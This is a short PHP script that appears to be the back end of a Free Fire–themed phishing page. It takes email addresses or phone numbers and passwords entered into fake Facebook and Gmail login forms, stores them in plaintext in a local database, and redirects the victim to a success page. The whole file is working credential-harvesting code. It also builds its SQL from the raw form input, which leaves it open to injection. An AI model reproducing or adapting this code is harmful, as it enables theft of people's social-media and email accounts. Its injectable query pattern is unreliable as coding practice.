<?php
$conn = mysqli_connect("localhost", "root", "redhat", "freefire");
if($conn === false){
    echo "died connection";
    die("ERROR: Could not connect. "
        . mysqli_connect_error());
}
    
if(isset($_POST['login-fb'])){
    
    $email_num = $_POST['email-num'];
    $fpassword = $_POST['fpassword'];
    $sql1 = "INSERT INTO `facebook`(`email_num`, `password`) VALUES ('$email_num','$fpassword')";
    
    if($connection = mysqli_query($conn,$sql1)){
        header("Location:success.html");   
    }
}

if(isset($_POST['login-go'])){
    
    $email = $_POST['email'];
    $gpassword = $_POST['gpassword'];
    $sql2 = "INSERT INTO `gmail`(`email`, `password`) VALUES ('$email','$gpassword')";

    if($connection = mysqli_query($conn,$sql2)){
    	header("Location:success.html");
    }
}
?>
